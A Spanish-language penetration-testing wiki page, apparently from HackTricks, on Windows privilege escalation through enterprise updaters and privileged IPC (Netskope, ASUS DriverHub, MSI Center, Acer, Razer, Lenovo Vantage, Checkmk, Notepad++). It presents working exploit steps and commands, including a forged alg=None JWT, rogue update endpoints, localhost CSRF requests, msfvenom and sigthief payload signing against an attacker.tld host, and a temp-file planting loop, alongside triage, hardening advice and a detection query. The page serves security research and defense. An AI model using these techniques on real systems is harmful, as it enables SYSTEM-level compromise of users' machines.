# Abusando de actualizadores empresariales y de IPC privilegiado (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios locales en Windows encontradas en agentes y actualizadores empresariales para endpoints que exponen una superficie de IPC de fácil acceso y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el registro en un servidor controlado por un atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC en localhost de un servicio privilegiado para forzar un nuevo registro o una reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y dirigir el actualizador a un paquete malicioso «firmado».
- Evadir comprobaciones débiles del firmante (listas de permitidos de CN), indicadores de digest opcionales y propiedades laxas de MSI.
- Si el IPC está «cifrado», derivar la clave/IV de identificadores de máquina legibles por todos y almacenados en el registro.
- Si el servicio restringe a los llamantes según la ruta de la imagen o el nombre del proceso, inyectar código en un proceso incluido en la lista de permitidos o crear uno suspendido y cargar la DLL mediante una modificación mínima del contexto del hilo.

Los servicios TCP locales personalizados merecen la misma revisión de identidad y límites de entrada, incluso si requieren un PIN u otra credencial de la aplicación. Identifica el proceso asociado al listener y la cuenta de servicio efectiva; luego inspecciona el binario/versión desplegado exacto y comprueba si los campos controlados por el llamante se validan por longitud antes de copiarlos a búferes fijos o usarlos para construir el comando de un proceso hijo. [La guía de Microsoft sobre desbordamientos de búfer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explica por qué las entradas externas no validadas son peligrosas en código nativo privilegiado. Un listener de loopback, una credencial codificada de forma fija o un nombre de proceso, por sí solos, no demuestran corrupción de memoria ni ejecución como SYSTEM; la accesibilidad, la autorización, la ruta de código y las mitigaciones son condiciones independientes. Mantén la enumeración rutinaria en modo pasivo en vez de enviar entradas con longitudes que provoquen fallos a un servicio activo.

---
## 1) Forzar el registro en un servidor del atacante mediante IPC en localhost

Muchos agentes incluyen un proceso de interfaz de usuario en modo usuario que se comunica con un servicio SYSTEM a través de TCP en localhost mediante JSON.

Observado en Netskope:
- Interfaz de usuario: stAgentUI (integridad baja) ↔ Servicio: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crear un token de registro JWT cuyas claims controlen el host del backend (p. ej., AddonUrl). Usar alg=None para que no se requiera firma.
2) Enviar el mensaje IPC que invoca el comando de aprovisionamiento con tu JWT y el nombre del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) El servicio empieza a conectarse a tu servidor rogue para obtener datos de inscripción/configuración, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en la ruta o el nombre, origina la solicitud desde un binario del proveedor incluido en la allow-list (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de administración expuesto a la red

Este límite de confianza no siempre se restringe a localhost. En el caso reportado de MyReport Updater 2.1.1, un servicio `LocalSystem` escuchaba en todas las interfaces y aceptaba cambios de configuración gRPC sin autenticación para el host de referencia, el puerto y el modo operativo. Para la variante remota, se requería tanto acceso de red al listener como acceso saliente del servicio al host de referencia elegido. Evalúa estos aspectos por separado de si el flujo posterior del paquete puede cruzar el límite de escritura de archivos.<sup>[[16]](#references)</sup>

---
## 2) Secuestrar el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y dirígelo a un MSI controlado por el atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, por ejemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA PEM. El servicio lo instala en el almacén Trusted Root de Local Machine.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y una versión falsa.

Cómo eludir comprobaciones comunes observadas en la práctica:
- Allow-list del CN del firmante: el servicio puede que solo compruebe que el Subject CN sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad benigna de MSI llamada CERT_DIGEST. No se valida durante la instalación.
- Aplicación opcional del digest: una flag de configuración (p. ej., check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
y ejecuta código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección sobre cómo eludir parches: si un proveedor responde añadiendo una pequeña lista de dominios “confiables” en lugar de autenticar criptográficamente el origen de las actualizaciones, busca redirectors o reverse proxies propiedad del proveedor que aún te permitan dirigir el tráfico. En el caso de Netskope, investigaciones públicas posteriores mostraron que una allow-list de la época de R129 aún podía eludirse mediante `rproxy.goskope.com`, que actuaba como proxy de contenido de Azure App Service controlado por el atacante. Considera las allow-lists de hostname como un obstáculo menor, no como un límite de confianza.<sup>[[14]](#references)</sup>

Otro modo de fallo es el de los **metadatos de paquete coherentes entre sí, pero no autenticados**. En el caso de MyReport, una referencia controlada por el atacante servía un archivo modificado, mientras un intermediario cambiaba el digest MD5 y las respuestas de tamaño del proveedor antes de que llegaran al updater. La coincidencia de esos valores comprobaba la coherencia de las respuestas, no el origen del proveedor; no hizo falta ninguna colisión MD5. Un directorio de instalación elegido por quien realizaba la llamada convirtió entonces la extracción privilegiada en un límite de escritura de archivos. La primitiva resultante de carga de DLL se explica en [encadenar una escritura arbitraria de archivos con un secuestro de DLL](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsificación de solicitudes IPC cifradas (cuando existan)

Desde R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. La ingeniería inversa reveló AES con la clave/IV derivadas de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agente de pronto “cifra” su IPC, busca IDs de dispositivo, GUID de producto e IDs de instalación en HKLM que puedan usarse como material.

---
## 4) Elusión de allow-lists de procesos llamantes de IPC (comprobaciones de ruta/nombre)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con los binarios del proveedor incluidos en una allow-list y ubicados en Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos formas prácticas de eludirlo:
- Inyección de DLL en un proceso incluido en la allow-list (p. ej., nsdiag.exe) y proxy IPC desde dentro del proceso.
- Inicia un binario incluido en la allow-list en estado suspendido y prepara tu proxy DLL sin CreateRemoteThread (consulta §5) para cumplir las reglas antimanipulación aplicadas por el driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inyección compatible con la protección antimanipulación: proceso suspendido + parche de NtContinue

A menudo, los productos incluyen un driver minifilter/callbacks OB (p. ej., Stadrv) para quitar derechos peligrosos de los handles a procesos protegidos:
- Proceso: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader fiable en user-mode que respeta estas restricciones:
1) Crea un proceso con un binario del proveedor mediante CREATE_SUSPENDED.
2) Obtén los handles que aún tienes permitido usar: PROCESS_VM_WRITE | PROCESS_VM_OPERATION en el proceso y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas el código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano con mapeo garantizado) con un stub pequeño que llame a LoadLibraryW con la ruta de tu DLL y luego vuelva.
4) Ejecuta ResumeThread para activar el stub dentro del proceso y cargar tu DLL.

Como nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME en un proceso ya protegido (lo creaste tú), cumples la política del driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Herramientas prácticas
- NachoVPN (plugin de Netskope) automatiza la creación de una rogue CA, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC personalizado que crea mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la inyección en procesos suspendidos para originar la solicitud desde un binario incluido en la allow-list.<sup>[[4]](#references)</sup>

## 7) Flujo rápido de triage para superficies desconocidas de updater/IPC

Al analizar un nuevo agente de endpoint o una suite de “helpers” de motherboard, normalmente basta un flujo de trabajo rápido para determinar si se trata de un objetivo prometedor para privesc:<sup>[[6]](#references)</sup>

1) Enumera los listeners de loopback y relaciónalos con los procesos del proveedor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumera las named pipes candidatas:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraer datos de enrutamiento almacenados en el registro que utilizan los servidores IPC basados en plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrae primero los nombres de endpoints, las claves JSON y los ID de comandos del cliente en modo usuario. Los frontends de Electron/.NET empaquetados suelen hacer leak de todo el esquema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Busca el predicado de confianza real, no solo la ruta de código que finalmente inicia el proceso:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrones a los que conviene dar prioridad:
- El uso de `CryptQueryObject`/análisis de certificados sin `WinVerifyTrust` suele indicar que se trató «existe un certificado» como «el certificado es de confianza», lo que permite clonar certificados u otras técnicas con firmantes falsos.
- Las comprobaciones de subcadenas/sufijos en `Origin`, `Referer`, URLs de descarga, nombres de procesos o CN de firmantes no son autenticación. `contains(".vendor.com")` suele ser explotable mediante dominios similares controlados por un atacante.
- Si la GUI con pocos privilegios decide que «el archivo es de confianza» y el broker de SYSTEM simplemente consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele bastar para eludir por completo el límite de seguridad (validación dividida al estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o programa desde esa ruta, comprueba de inmediato si hay ventanas de reemplazo TOCTOU y si existen módulos plugin hermanos que expongan wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos que usan mucho named pipes, PipeViewer permite detectar rápidamente DACL débiles y pipes accesibles remotamente antes de empezar a revertir el protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a quienes llaman solo mediante PID, ruta de imagen o nombre del proceso, considéralo un obstáculo menor, no un límite de seguridad: inyectar código en el cliente legítimo o conectarse desde un proceso incluido en la allow-list suele bastar para superar las comprobaciones del servidor. En el caso de named pipes, [esta página sobre suplantación de clientes y abuso de pipes](named-pipe-client-impersonation.md) explica el primitive con más detalle.

Para un **broker de limpieza o restauración** privilegiado, inspecciona el límite de confianza de las rutas además de la ACL del pipe. Un usuario con menos privilegios podría seleccionar un destino de restauración o cambiar el nombre de un artefacto de backup preparado en un directorio compartido, incluso si el ejecutable del servicio y su directorio de instalación están protegidos. Confirma por separado que el usuario puede acceder al comando de restauración, modificar exactamente el archivo de entrada preparado o su nombre, que el broker se ejecuta con una identidad de mayor privilegio y que la operación de restauración realmente escribe en la ruta protegida seleccionada. Un directorio de preparación con permisos de escritura o un pipe legible, por sí solos, no demuestran que sea posible realizar una escritura privilegiada arbitraria; la asignación del destino y el comportamiento del servicio requieren revisión del código o pruebas controladas. No ejecutes un comando de limpieza desconocido durante el reconocimiento pasivo, ya que podría eliminar archivos del usuario.

---
## 8) Brokers de add-ins modulares autenticados solo mediante firmas del proveedor (patrón Lenovo Vantage)

Una variante más reciente que conviene buscar es el **broker RPC de cliente firmado**: un proceso de escritorio Lenovo firmado, con pocos privilegios, se comunica con un servicio SYSTEM, y el servicio enruta comandos JSON a un conjunto de add-ins descritos en XML bajo `%ProgramData%`. Una vez que se consigue ejecución de código **dentro de cualquier cliente firmado aceptado**, cada contrato `runas="system"` pasa a formar parte de la superficie de ataque.<sup>[[15]](#references)</sup>

Primitives de alto valor observados en investigaciones sobre Lenovo Vantage:
- **Confiar en quien llama porque tiene la firma del proveedor**: los investigadores llegaron a un contexto autenticado copiando un EXE firmado por Lenovo a un directorio con permisos de escritura y satisfaciendo un DLL side-load (`profapi.dll`), de modo que código arbitrario se ejecutara dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la superficie de ataque mediante manifiestos**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, por lo que enumerar esos manifiestos suele revelar los verbos privilegiados reales más rápido que revertir el broker.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente de confianza, investigaciones públicas encontraron traversal de rutas y condiciones de carrera en verbos de actualización/instalación, abuso de SQL sin procesar en bases de datos de configuración privilegiadas y comprobaciones de rutas del registro basadas en subcadenas que permitían escribir fuera de la hive prevista.

Reconocimiento útil en un objetivo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusión práctica: siempre que una suite de herramientas auxiliares exponga un broker que primero autentica el **proceso llamante** y solo después despacha decenas de comandos de plugins/complementos, no te detengas tras saltarte la comprobación de confianza inicial. Vuelca la tabla de manifiesto/contrato y fuzzing cada verbo de alto privilegio de forma independiente; el canal autenticado suele ocultar varios errores de segunda etapa.

---
## 1) CSRF del navegador contra localhost frente a APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador procedentes de https://driverhub.asus.com. El filtro de origen simplemente ejecuta `string_contains(".asus.com")` sobre la cabecera Origin y sobre las URL de descarga expuestas por `/asus/v1.0/*`. Por tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede emitir solicitudes que modifican el estado desde JavaScript.<sup>[[6]](#references)</sup> Consulta [conceptos básicos de CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) para conocer otros patrones de bypass.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON que espera el handler; el JS del frontend empaquetado muestra el esquema a continuación.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Incluso la CLI de PowerShell que se muestra a continuación funciona cuando se falsifica el encabezado Origin para que tenga el valor de confianza:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o de 0 clic mediante `onload`) que controla un helper con privilegios SYSTEM.

---
## 2) Verificación insegura de code-signing y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los almacena en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de subcadenas, por lo que se acepta `http://updates.asus.com.attacker.tld:8000/payload.exe`. Después de la descarga, ADU.exe solo comprueba que el PE contenga una firma y que la cadena Subject coincida con ASUS antes de ejecutarlo: no hay `WinVerifyTrust` ni validación de la cadena.

Para convertir el flujo en un exploit:
1) Crea un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona en él el firmante de ASUS (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio parecido a `.asus.com` y activa UpdateApp mediante el CSRF del navegador anterior.

Como los filtros de Origin y URL se basan en subcadenas y la comprobación del firmante solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante con su contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU en las rutas de copia y ejecución del updater (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP en el que cada trama es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable proporcionado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar la trama A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de firma se supere y que la tarea quede en cola).
- Competir enviando repetidamente mensajes de la trama B que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando se active el programador, ejecutará el payload sobrescrito como SYSTEM, aunque se haya validado el archivo original. Para explotar esto de forma fiable, se usan dos goroutines/threads que envían spam a CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado a nivel SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de una trama seleccionan ese componente, lo que permite a los atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin validar la firma**: cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Capturar el tráfico loopback con Wireshark o instrumentar los binarios .NET en dnSpy permite revelar rápidamente la correspondencia entre Component y comandos; después, clientes personalizados en Go/Python pueden reproducir las tramas.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonation
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina del servicio que inicia procesos.
- La biblioteca del cliente serializa un byte terminador mágico (113) junto con los args. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para ver consejos de instrumentación) muestra que el handler nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) lleva a la rama genérica, que conserva el token SYSTEM completo y establece un SID de integridad alta (`S-1-16-12288`). Por tanto, el binario iniciado se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combina esto con la flag de instalador expuesta (`Setup.exe -nocheck`) para instalar ACC incluso en VM de laboratorio y probar el pipe sin hardware del proveedor.<sup>[[6]](#references)</sup>

Estos errores de IPC destacan por qué los servicios de localhost deben aplicar autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, filtrado de tokens) y por qué el helper de cada módulo para “ejecutar un binario arbitrario” debe usar las mismas verificaciones de firmante.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en user-mode (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que inicie un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega a una DLL de user-mode (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instancia el objeto COM `RzUtility.Elevator`.
- Llama a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un inicio con privilegios elevados.
- En el PoC público, se parchea la comprobación de la firma PE dentro de `simple_service.dll` antes de enviar la solicitud, lo que permite iniciar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocación mínima en PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusión general: al hacer reversing de suites “helper”, no te limites a TCP en localhost o a named pipes. Comprueba si hay clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y luego verifica si el servicio privilegiado valida realmente el binario de destino o si simplemente confía en un resultado calculado por una DLL cliente en user-mode que se puede parchear. Este patrón se generaliza más allá de Razer: cualquier diseño dividido en el que el broker de alto privilegio consuma una decisión de permitir/denegar de la parte de bajo privilegio es una posible superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre del archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario sin privilegios elevados puede crear de antemano el futuro archivo temporal como **solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en compilaciones vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- activación: **reparación** MSI del paquete de agente en caché<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Estima un rango realista de PID a partir de los ID de proceso actuales o del PID del agente en ejecución.
2. Escribe una carga útil `.cmd` corta en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida UTF-16 de PowerShell para archivos batch).
3. Distribuye archivos `C:\Windows\Temp\cmk_all_<PID>_1.cmd` por el rango candidato y marca cada archivo como solo lectura.
4. Activa una reparación del MSI en caché para que el servicio privilegiado intente regenerar y luego ejecute el script temporal.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si el producto vulnerable está instalado mediante Windows Installer, identifica el nombre del producto asociado al archivo MSI almacenado en caché con nombre aleatorio en `C:\Windows\Installer` antes de iniciar la reparación:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde una shell WinRM no interactiva y necesitas determinar si una sesión de escritorio existente o desconectada puede activar correctamente la reparación.<sup>[[7]](#references)</sup>
- Este patrón se generaliza a otros agentes de endpoint y updaters que **preparan scripts temporales en ubicaciones world-writable y luego los ejecutan como SYSTEM**. Comprueba si los nombres son predecibles, si falta la semántica de creación exclusiva y si los flujos de reparación/actualización pueden activarse bajo demanda.

### Reparación interactiva del instalador y consola privilegiada

PDF24 Creator 11.15.1 ilustra un riesgo distinto de reparación de MSI: su acción personalizada de instalación de impresoras puede iniciar una consola visible con privilegios de SYSTEM durante la reparación. El proveedor modificó el instalador MSI en la versión 11.15.2 para corregir este comportamiento. Una versión antigua del producto solo es una pista para el triage. Comprueba el paquete MSI registrado o accesible, si este usuario puede iniciar la reparación, si están presentes la acción personalizada vulnerable y el retardo del archivo de log, y si un escritorio interactivo puede mostrar la consola. El retardo reportado utilizaba un oplock en `faxPrnInst.log`; que el archivo permita escritura normal no es la única condición de acceso. Una shell no interactiva, un paquete inaccesible o un instalador parcheado pueden interrumpir la cadena. Este problema no depende de `AlwaysInstallElevated` y es distinto de reemplazar un script temporal predecible.

---
## Secuestro remoto de la cadena de suministro mediante validación débil del updater (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, atacantes que comprometieron la infraestructura de alojamiento detrás del flujo de actualización de Notepad++ entregaron de forma selectiva manifiestos maliciosos a víctimas específicas. Los updaters antiguos basados en WinGUp no verificaban completamente la autenticidad de las actualizaciones, por lo que una respuesta XML maliciosa podía redirigir a los clientes a URL controladas por los atacantes. Como el cliente aceptaba contenido HTTPS sin exigir tanto una cadena de certificados de confianza como una firma PE válida en el instalador descargado, las víctimas descargaban y ejecutaban un `update.exe` NSIS troyanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no requiere exploit local):
1. **Interceptación de la infraestructura**: comprometer el CDN/alojamiento y responder a las comprobaciones de actualización con metadatos del atacante que apunten a una URL de descarga maliciosa.
2. **NSIS troyanizado**: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
   - **Bring-your-own signed binary + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y colocar un `log.dll` malicioso en su ruta de búsqueda. Cuando se ejecuta el binario firmado, Windows carga mediante sideload `log.dll`, que descifra y carga de forma reflectiva la backdoor Chrysalis (protegida por Warbird + hashing de API para dificultar la detección estática).
   - **Inyección de shellcode mediante scripts**: NSIS ejecuta un script Lua compilado que utiliza APIs de Win32 (p. ej., `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Recomendaciones de hardening/detección para cualquier updater:
- Exige la **verificación del certificado y la firma** del instalador descargado (fija el firmante del proveedor y rechaza un CN/cadena que no coincida) y firma el propio manifiesto de actualización (p. ej., XMLDSig). Bloquea las redirecciones controladas por el manifiesto salvo que se validen.
- Considera el **sideloading de binarios firmados BYO** como un punto de pivote de detección posterior a la descarga: genera alertas cuando un EXE firmado del proveedor carga una DLL cuyo nombre proviene de fuera de su ruta canónica de instalación (p. ej., Bitdefender carga `log.dll` desde Temp/Downloads) y cuando un updater coloca/ejecuta instaladores desde una ubicación temporal con firmas que no pertenecen al proveedor.
- Supervisa los **artefactos específicos del malware** observados en esta cadena (útiles como pivotes genéricos): el mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y etapas de inyección de shellcode impulsadas por Lua.
- Notepad++ respondió reforzando WinGUp en la versión v8.8.9 y posteriores: ahora el XML recibido está firmado (XMLDSig), y las compilaciones más recientes exigen la verificación del certificado y la firma del instalador descargado, en lugar de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading de <code>log.dll</code> mediante EXE firmado de Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
